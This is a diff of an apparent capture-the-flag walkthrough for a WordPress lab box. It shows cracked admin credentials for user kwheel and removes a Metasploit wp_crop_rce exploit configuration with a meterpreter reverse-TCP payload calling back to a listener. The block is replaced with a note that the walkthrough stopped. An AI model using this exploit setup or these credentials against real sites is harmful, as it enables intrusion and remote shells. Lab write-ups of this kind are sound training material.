@@ -272,32 +272,4 @@ password is cutiepie1 for user kwheel
 > So wp admin panel accessed<br/>
 > Let's look around
 
-Module options (exploit/multi/http/wp_crop_rce):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.10.227.2      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
-                                         ki/Using-Metasploit
-   RPORT      80               yes       The target port (TCP)
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /                yes       The base path to the wordpress application
-   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
-   USERNAME   kwheel           yes       The WordPress username to authenticate with
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (php/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  10.9.31.248      yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   WordPress
+# WALKINTHOUGH STOPPED DUE TO UNEXPECTED ERROR
